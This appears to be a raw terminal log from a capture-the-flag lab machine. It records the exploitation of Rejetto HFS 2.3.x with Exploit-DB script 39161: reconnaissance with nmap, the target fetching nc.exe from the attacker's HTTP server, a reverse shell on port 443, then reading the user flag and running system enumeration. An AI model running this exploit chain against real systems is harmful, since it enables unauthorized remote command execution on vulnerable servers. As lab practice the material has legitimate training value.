@@ -1,1 +1,223 @@
+hippoeug@kali:~$ nmap -p 80 --script http-methods 10.10.10.8
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-03 14:37 +08
+Nmap scan report for 10.10.10.8
+Host is up (0.046s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+
+Nmap done: 1 IP address (1 host up) scanned in 1.22 seconds
+
+
+
+hippoeug@kali:~$ nc 10.10.10.8 80
+
+
+
+hippoeug@kali:~$ searchsploit -x 39161.py
+  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                                        
+      URL: https://www.exploit-db.com/exploits/39161                                                                                                                  
+     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py                                                                                                      
+File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators                                                                     
+                                                                                                                                                                      
+hippoeug@kali:~$ searchsploit -m 39161.py                                                                                                                             
+  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
+      URL: https://www.exploit-db.com/exploits/39161
+     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
+File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators
+
+Copied to: /home/hippoeug/39161.py
+
+
+
+
+hippoeug@kali:~$ nano 39161.py
+
+ip_addr = "10.10.14.16" #local IP address
+local_port = "80" # Local Port number
+
+hippoeug@kali:~$ python 39161.py 10.10.10.8 80
+
+
+hippoeug@kali:~$ sudo nc -lvnp 80
+listening on [any] 80 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.8] 49322
+GET /nc.exe HTTP/1.1
+Accept: */*
+Accept-Language: el
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; WOW64; Trident/7.0; .NET4.0E; .NET4.0C)
+Host: 10.10.14.16
+Connection: Keep-Alive
+
+
+
+#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).  
+#          You may need to run it multiple times for success!
+
+
+
+hippoeug@kali:~/Documents$ sudo python -m SimpleHTTPServer 80
+[sudo] password for hippoeug: 
+Serving HTTP on 0.0.0.0 port 80 ...
+10.10.10.8 - - [03/Jan/2021 16:05:55] "GET /nc.exe HTTP/1.1" 200 -
+10.10.10.8 - - [03/Jan/2021 16:05:55] "GET /nc.exe HTTP/1.1" 200 -
+10.10.10.8 - - [03/Jan/2021 16:05:55] "GET /nc.exe HTTP/1.1" 200 -
+10.10.10.8 - - [03/Jan/2021 16:05:55] "GET /nc.exe HTTP/1.1" 200 -
+10.10.10.8 - - [03/Jan/2021 16:06:37] "GET /nc.exe HTTP/1.1" 200 -
+10.10.10.8 - - [03/Jan/2021 16:06:37] "GET /nc.exe HTTP/1.1" 200 -
+10.10.10.8 - - [03/Jan/2021 16:06:37] "GET /nc.exe HTTP/1.1" 200 -
+10.10.10.8 - - [03/Jan/2021 16:06:37] "GET /nc.exe HTTP/1.1" 200 -
+
+
+
+
+hippoeug@kali:~$ nano 39161.py
+
+        ip_addr = "10.10.14.16" #local IP address
+        local_port = "443" # Local Port number
+
+
+hippoeug@kali:~$ python 39161.py 10.10.10.8 80
+
+
+
+
+
+
+
+hippoeug@kali:~$ sudo nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.8] 49330
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\kostas\Desktop>
+
+C:\Users\kostas\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is D0BC-0196
+
+ Directory of C:\Users\kostas\Desktop
+
+09/01/2021  04:47 ��    <DIR>          .
+09/01/2021  04:47 ��    <DIR>          ..
+18/03/2017  02:11 ��           760.320 hfs.exe
+18/03/2017  02:13 ��                32 user.txt.txt
+               2 File(s)        760.352 bytes
+               2 Dir(s)  31.899.250.688 bytes free
+
+
+C:\Users\kostas\Desktop>type user.txt.txt
+type user.txt.txt
+d0c39409d7b994a9a1389ebf38ef5f73
+C:\Users\kostas\Desktop>
+
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is D0BC-0196
+
+ Directory of C:\Users
+
+18/03/2017  01:57 ��    <DIR>          .
+18/03/2017  01:57 ��    <DIR>          ..
+18/03/2017  01:52 ��    <DIR>          Administrator
+18/03/2017  01:57 ��    <DIR>          kostas
+09/01/2021  07:04 ��    <DIR>          Public
+               0 File(s)              0 bytes
+               5 Dir(s)  31.899.250.688 bytes free
+
+C:\Users>cd Administrator
+cd Administrator
+Access is denied.
+
+C:\Users>
+
+
+
+
+
+C:\Users>systeminfo
+systeminfo
+
+Host Name:                 OPTIMUM
+OS Name:                   Microsoft Windows Server 2012 R2 Standard
+OS Version:                6.3.9600 N/A Build 9600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00252-70000-00000-AA535
+Original Install Date:     18/3/2017, 1:51:36 ��
+System Boot Time:          9/1/2021, 4:45:50 ��
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             el;Greek
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest
+Total Physical Memory:     4.095 MB
+Available Physical Memory: 3.456 MB
+Virtual Memory: Max Size:  5.503 MB
+Virtual Memory: Available: 4.885 MB
+Virtual Memory: In Use:    618 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              \\OPTIMUM
+Hotfix(s):                 31 Hotfix(s) Installed.
+                           [01]: KB2959936
+                           [02]: KB2896496
+                           [03]: KB2919355
+                           [04]: KB2920189
+                           [05]: KB2928120
+                           [06]: KB2931358
+                           [07]: KB2931366
+                           [08]: KB2933826
+                           [09]: KB2938772
+                           [10]: KB2949621
+                           [11]: KB2954879
+                           [12]: KB2958262
+                           [13]: KB2958263
+                           [14]: KB2961072
+                           [15]: KB2965500
+                           [16]: KB2966407
+                           [17]: KB2967917
+                           [18]: KB2971203
+                           [19]: KB2971850
+                           [20]: KB2973351
+                           [21]: KB2973448
+                           [22]: KB2975061
+                           [23]: KB2976627
+                           [24]: KB2977629
+                           [25]: KB2981580
+                           [26]: KB2987107
+                           [27]: KB2989647
+                           [28]: KB2998527
+                           [29]: KB3000850
+                           [30]: KB3003057
+                           [31]: KB3014442
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) 82574L Gigabit Network Connection
+                                 Connection Name: Ethernet0
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.8
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
+
+
+
+
+
 
